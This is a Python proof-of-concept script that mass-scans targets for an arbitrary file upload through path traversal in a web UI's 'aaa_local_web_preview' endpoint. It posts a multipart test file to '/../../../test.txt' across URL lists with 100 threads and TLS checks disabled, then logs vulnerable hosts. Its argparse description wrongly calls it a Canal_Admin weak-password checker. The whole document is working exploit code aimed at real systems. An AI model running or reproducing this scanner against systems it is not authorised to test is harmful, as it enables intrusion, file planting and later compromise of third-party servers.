import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    '''主函数'''
    banner()            
    parser = argparse.ArgumentParser(description = 'Canal_Admin弱口令')    #实例化对象
    parser.add_argument('-u','--url',help='请输入你要判断的url')        #添加变量，参数
    parser.add_argument('-f','--file',help='请输入你要批量的url')       #添加变量，参数
    agres = parser.parse_args()                                     #实例化
    if agres.url and not agres.file:                        #判断url和文件
        poc(agres.url)                              #如果是url就调用poc
    elif agres.file and not agres.url:              #判断url和文件     
        url_list = []                             #定义列表
        with open (agres.file,'r',encoding='utf-8') as fp:  #以读的方式，utp-8编码打开文件
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     #首尾去空
        mp = Pool(100)                      #定义线程数100
        mp.map(poc, url_list)               #定义线程数
        mp.close()                          #关闭
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')              #f 格式化输出 usag 用法 \t 制表符   sys.argv[0] 获取脚本文件名

def banner():
    '''横幅'''
    test = """                                                                                                                        

 ____  ____  ____       _     ____  ____  ____  _          _      _____ ____       ____  ____  _____ _     _  _____ _     
/  _ \/  _ \/  _ \     / \   /  _ \/   _\/  _ \/ \        / \  /|/  __//  _ \     /  __\/  __\/  __// \ |\/ \/  __// \  /|
| / \|| / \|| / \|     | |   | / \||  /  | / \|| |        | |  |||  \  | | //     |  \/||  \/||  \  | | //| ||  \  | |  ||
| |-||| |-||| |-||     | |_/\| \_/||  \_ | |-||| |_/\     | |/\|||  /_ | |_\\     |  __/|    /|  /_ | \// | ||  /_ | |/\||
\_/ \|\_/ \|\_/ \|_____\____/\____/\____/\_/ \|\____/_____\_/  \|\____\\____/_____\_/   \_/\_\\____\\__/  \_/\____\\_/  \|
                  \____\                             \____\                  \____\                                       
                                  
                                                                                                        version: 1.0.0
                                                                                                         author:sis2311@lsk

"""
    print(test)             #打印test


def poc(target):
    '''检测漏洞'''
    url = target + '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.txt'
    headers = {          
           'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a'
    }
    data = '''--849978f98abe41119122148e4aa65b1a\r\nContent-Disposition: form-data; name="123"; filename="test.txt"\r\nContent-Type: text/plain\r\n\r\n123!!!\r\n--849978f98abe41119122148e4aa65b1a--'''
    
    try:
        result = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if 'success' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+] 存在漏洞 {target} '+'\n')
        else:
            print(f'[-]{target} is not vulabe')
    except:
        print(f'[*]{target} server error')

'''检测漏洞脚本'''
if __name__ == '__main__':
    '''定义主函数'''
    main()